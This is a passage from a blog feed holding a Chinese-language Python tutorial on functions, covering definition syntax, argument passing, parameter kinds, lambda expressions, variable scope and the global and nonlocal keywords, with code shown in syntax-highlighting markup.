class="token boolean">False</span><span class="token boolean">True</span><span class="token boolean">False</span><span class="token boolean">False</span><span class="token boolean">False</span><span class="token boolean">True</span><span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-函数</title>
      <link href="/post/Python-Function/"/>
      <url>/post/Python-Function/</url>
      
        <content type="html"><![CDATA[<p>有两种定义函数的方法，千万不要忘了冒号和<code>return</code>   ( ´⚰︎` ) </p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">函数</font> </center><br><br><blockquote><p><strong>函数分为：</strong><font color="#FF7F00"><strong>内置（系统）函数和自定义函数</strong></font>。</p><ol><li>自定义函数又分为普通（有名字的）函数和匿名（无名字的）函数，二者定义方式不一样；</li><li>自定义和函数里面还可嵌套定义其他函数，匿名函数定义时是一条语句，并且要赋值给一个变量指针。</li><li>普通函数的函数体如果为空，则必须放入一条pass语句，否则会报错；函数体不为空的必须有return语句，否则会报错。</li></ol></blockquote><br><br><h3 id="一-定义函数"><font color="#FF6347" face="Comic sans MS">一. 定义函数</font><a href="post/Python-Function#一-定义函数"></a></h3><blockquote><p><strong>自定义函数简单的规则：</strong></p><ol><li>函数代码块以 <code>def</code> 关键词开头，依次写出函数名、括号、括号中的参数和冒号<code>:</code>。</li><li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li><li>函数内容以冒号起始，并且缩进写代码块结构。</li><li>用<code>return [表达式]</code>结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。还可以返回多个值，如<code>return x,y</code></li></ol></blockquote><br><p><font color="#00B2EE" face="Comic sans MS"><strong>语法</strong></font></p><p>Python 定义函数使用 def 关键字，默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。一般格式如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> 函数名（参数列表）<span class="token punctuation">:</span>    函数体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><p>以自定义一个求绝对值的my_abs函数为例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_abs</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> x <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span>x运行结果：<span class="token number">99</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="二-参数传递"><font color="#FF6347" face="Comic sans MS">二. 参数传递</font><a href="post/Python-Function#二-参数传递"></a></h3><p>在 python 中，类型属于对象，变量是没有类型的：<br><code>a=[1,2,3]</code><br><code>a=&quot;Runoob&quot;</code><br>以上代码中，[1,2,3] 是 List 类型，”Runoob” 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。</p><br><p><font color="#00B2EE" face="Comic sans MS"><strong>一、可更改(mutable)与不可更改(immutable)对象</strong></font></p><p>在 python 中，<font color="#FF7F00"><strong>strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象</strong></font>。</p><p>python 函数的参数传递：</p><ul><li><p><strong>不可变类型：</strong>类似 c++ 的值传递，如 <strong>整数</strong>、<strong>字符串</strong>、<strong>元组</strong>。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</p></li><li><p><strong>可变类型：</strong>类似 c++ 的引用传递（地址），如 <strong>列表</strong>，<strong>字典</strong>。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</p></li></ul><blockquote><p>python 中<font color="#FF7F00"><strong>一切都是对象</strong></font>，严格意义我们不能说值传递还是引用传递，我们应该说<font color="#FF7F00"><strong>传不可变对象和传可变对象</strong></font>。</p></blockquote><br><p>python 传不可变对象实例:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ChangeInt</span><span class="token punctuation">(</span> a <span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">2</span>ChangeInt<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span> b <span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 结果是 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><blockquote><p>实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它。</p></blockquote></blockquote><br><p>传可变对象实例:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">changeme</span><span class="token punctuation">(</span> mylist <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"修改传入的列表"</span>   mylist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数内取值1: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span>   mylist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数内取值2: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true"># 调用changeme函数</span>mylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>changeme<span class="token punctuation">(</span> mylist <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数外取值: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span>运行结果：函数内取值<span class="token number">1</span><span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span>函数内取值<span class="token number">2</span><span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>函数外取值<span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、参数</strong></font></p><p><strong>以下是调用函数时可使用的正式参数类型：</strong></p><ol><li><p><font color="#FF7F00"><strong>必需参数：</strong></font>调用函数时以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p></li><li><p><font color="#FF7F00"><strong>关键字参数：</strong></font>允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p></li><li><p><font color="#FF7F00"><strong>默认参数：</strong></font>定义函数时可指定参数值，调用函数时，如果没有传递参数，则会使用默认参数。</p></li><li><p><font color="#FF7F00"><strong>不定长参数：</strong></font>能处理比当初声明时更多的参数，这些参数被包装进一个<font color="#FF7F00"><strong>元组</strong></font>或<font color="#FF7F00"><strong>字典</strong></font>，通常，这些 可变 参数是参数列表中的最后一个，因为它们将把所有的剩余输入参数传递给函数。</p></li></ol><br><p><font color="#FF7F00" face="Comic sans MS"><strong>1. 必需参数：</strong></font></p><p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p><p>调用printme()函数，你必须传入一个参数，不然会出现语法错误：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#可写函数说明</span><span class="token keyword">def</span> <span class="token function">printme</span><span class="token punctuation">(</span> str <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的字符串"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true">#调用printme函数</span>printme<span class="token punctuation">(</span><span class="token punctuation">)</span>以上实例输出结果：Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"test.py"</span><span class="token punctuation">,</span> line <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    printme<span class="token punctuation">(</span><span class="token punctuation">)</span>TypeError<span class="token punctuation">:</span> printme<span class="token punctuation">(</span><span class="token punctuation">)</span> missing <span class="token number">1</span> required positional argument<span class="token punctuation">:</span> <span class="token string">'str'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#FF7F00" face="Comic sans MS"><strong>2. 关键字参数：</strong></font></p><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p><p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。<br>以下实例中演示了函数参数的使用不需要使用指定顺序：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的字符串"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"名字: "</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"年龄: "</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true">#调用printinfo函数</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span>以上实例输出结果：名字<span class="token punctuation">:</span>  runoob年龄<span class="token punctuation">:</span>  <span class="token number">50</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#FF7F00" face="Comic sans MS"><strong>3. 默认参数：</strong></font></p><p>调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token operator">=</span> <span class="token number">35</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的字符串"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"名字: "</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"年龄: "</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true">#调用printinfo函数</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"------------------------"</span><span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span>以上实例输出结果：名字<span class="token punctuation">:</span>  runoob年龄<span class="token punctuation">:</span>  <span class="token number">50</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>名字<span class="token punctuation">:</span>  runoob年龄<span class="token punctuation">:</span>  <span class="token number">35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#FF7F00" face="Comic sans MS"><strong>4. 不定长参数：</strong></font></p><blockquote><p><strong>你可能需要一个函数能处理比当初声明时更多的参数：</strong></p><ol><li>加了星号 <code>*</code> 的参数会以<font color="#FF7F00"><strong>元组(tuple)</strong></font>的形式导入，存放所有未命名的变量参数。</li><li>加了两个星号<code>**</code>的参数会以<font color="#FF7F00"><strong>字典(dict)</strong></font>的形式导入。</li><li>声明函数时，参数中星号 * 可以单独出现。</li><li>如果单独出现星号 * 后的参数必须用关键字传入。</li></ol></blockquote><br><ol><li>加了星号<code>*</code>的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> <span class="token operator">*</span>vartuple <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的参数"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"输出: "</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>   <span class="token keyword">for</span> var <span class="token keyword">in</span> vartuple<span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"循环输出: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>var<span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true"># 调用printinfo 函数</span>printinfo<span class="token punctuation">(</span> <span class="token number">10</span> <span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token punctuation">)</span>输出结果：输出<span class="token punctuation">:</span><span class="token number">10</span>输出<span class="token punctuation">:</span><span class="token number">70</span>循环输出<span class="token punctuation">:</span><span class="token number">60</span>循环输出<span class="token punctuation">:</span><span class="token number">50</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="2"><li>加了两个星号<code>**</code>的参数会以字典的形式导入。</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> <span class="token operator">**</span>vardict <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的参数"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"输出: "</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>vardict<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用printinfo 函数</span>printinfo<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>以上实例输出结果：<span class="token number">1</span><span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="3"><li>声明函数时，参数中星号 * 可以单独出现，例如:</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token operator">+</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><ol start="4"><li>如果单独出现星号 * 后的参数必须用关键字传入。</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token operator">+</span>ca <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 报错</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>报错如下：Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>TypeError<span class="token punctuation">:</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span> takes <span class="token number">2</span> positional arguments but <span class="token number">3</span> were given改正方式：a <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 正常</span><span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="三-匿名函数"><font color="#FF6347" face="Comic sans MS">三. 匿名函数</font><a href="post/Python-Function#三-匿名函数"></a></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>python 使用 lambda 来创建匿名函数。</strong></font></p><blockquote><p><strong>所谓匿名，意即不再使用 def 语句这样标准的形式定义一个函数。</strong></p><ol><li>lambda 只是一个表达式，函数体比 def 简单很多。</li><li>lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。</li><li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。<br>虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</li></ol></blockquote><br><p><strong>语法</strong><br>lambda 函数的语法只包含一个语句，如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">lambda</span> <span class="token punctuation">[</span>arg1 <span class="token punctuation">[</span><span class="token punctuation">,</span>arg2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>argn<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><p>如下实例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 可写函数说明</span>sum <span class="token operator">=</span> <span class="token keyword">lambda</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">:</span> arg1 <span class="token operator">+</span> arg2<span class="token comment" spellcheck="true"># 调用sum函数</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"相加后的值为 : "</span><span class="token punctuation">,</span> sum<span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"相加后的值为 : "</span><span class="token punctuation">,</span> sum<span class="token punctuation">(</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>以上实例输出结果：相加后的值为 <span class="token punctuation">:</span>  <span class="token number">30</span>相加后的值为 <span class="token punctuation">:</span>  <span class="token number">40</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="四-变量作用域"><font color="#FF6347" face="Comic sans MS">四. 变量作用域</font><a href="post/Python-Function#四-变量作用域"></a></h3><p>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</p><p>变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称。Python的作用域一共有4种，分别是：</p><ul><li><font color="#FF7F00"><strong>L （Local）</strong></font> 局部作用域</li><li><font color="#FF7F00"><strong>E （Enclosing）</strong></font> 闭包函数外的函数中(函数A中定义了函数B，A定义的变量对B来说是闭包函数外的函数)</li><li><font color="#FF7F00"><strong>G （Global）</strong></font> 全局作用域</li><li><font color="#FF7F00"><strong>B （Built-in）</strong></font> 内置作用域（内置函数所在模块的范围）</li></ul><p>以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内置中找。</p><pre class="line-numbers language-python"><code class="language-python">g_count <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment" spellcheck="true"># 全局作用域</span><span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    o_count <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 闭包函数外的函数中</span>    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        i_count <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment" spellcheck="true"># 局部作用域</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问，如下代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token string">'I am from Runoob'</span><span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>输出结果：I am <span class="token keyword">from</span> Runoob<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>实例中 msg 变量定义在 if 语句块中，但外部还是可以访问的。<br>如果将 msg 定义在函数中，则它就是局部变量，外部不能访问。</p></blockquote><br><br><h3 id="五-全局变量和局部变量"><font color="#FF6347" face="Comic sans MS">五. 全局变量和局部变量</font><a href="post/Python-Function#五-全局变量和局部变量"></a></h3><p>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。</p><p>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：</p><pre class="line-numbers language-python"><code class="language-python">total <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment" spellcheck="true"># 这是一个全局变量</span><span class="token comment" spellcheck="true"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> arg2 <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#返回2个参数的和."</span>    total <span class="token operator">=</span> arg1 <span class="token operator">+</span> arg2 <span class="token comment" spellcheck="true"># total在这里是局部变量.</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数内是局部变量 : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>    <span class="token keyword">return</span> total<span class="token comment" spellcheck="true">#调用sum函数</span>sum<span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数外是全局变量 : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>以上实例输出结果：函数内是局部变量 <span class="token punctuation">:</span>  <span class="token number">30</span>函数外是全局变量 <span class="token punctuation">:</span>  <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>global 和 nonlocal关键字</strong></font></p><blockquote><p><font color="#FF7F00"><strong>global</strong></font>：内部作用域使用全局变量，并且可以修改，作用影响全局；<br><font color="#FF7F00"><strong>nonlocal</strong></font>：函数A嵌套函数B，函数B使用函数A的变量，并且可以修改，作用影响函数A的这个变量；</p></blockquote><ol><li>当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。</li></ol><p>以下实例修改全局变量 num：</p><pre class="line-numbers language-python"><code class="language-python">num <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> num  <span class="token comment" spellcheck="true"># 需要使用 global 关键字声明</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>     num <span class="token operator">=</span> <span class="token number">123</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>fun1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>以上实例输出结果：<span class="token number">1</span><span class="token number">123</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><ol start="2"><li>如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token number">10</span>    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        nonlocal num   <span class="token comment" spellcheck="true"># nonlocal关键字声明</span>        num <span class="token operator">=</span> <span class="token number">100</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    inner<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>outer<span class="token punctuation">(</span><span class="token punctuation">)</span>以上实例输出结果：<span class="token number">100</span><span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 